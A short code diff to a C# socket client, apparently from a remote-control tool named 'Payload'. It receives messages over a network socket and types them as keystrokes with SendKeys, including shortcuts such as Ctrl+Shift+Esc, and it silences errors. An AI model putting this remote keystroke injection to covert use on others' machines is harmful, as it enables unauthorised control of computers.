@@ -91,22 +91,23 @@ namespace Payload.Core.Command.SocketClient
                     case "{DIVIDE}":
                     case "^(C)":
                     case "^(V)":
-                    case "%(F4)":
+                    case "%{F4}":
                     case "^(T)":
                     case "^(W)":
                     case "+(^)":
-                    case "^(%DEL)":
-                        try
-                        {
+                    case "^+{ESC}":
                             SendKeys.SendWait(msg);
-                        }
-                        catch { }
                         break;
                     default:
-                        char[] ch = msg.ToCharArray();
-                        foreach (char c in ch) 
+                        try
                         {
-                            SendKeys.SendWait(Char.ToString(c));
+                            char[] ch = msg.ToCharArray();
+                            foreach (char c in ch)
+                            {
+                                SendKeys.SendWait(Char.ToString(c));
+                            }
+                        }
+                        catch {
                         }
                         break;
                 }
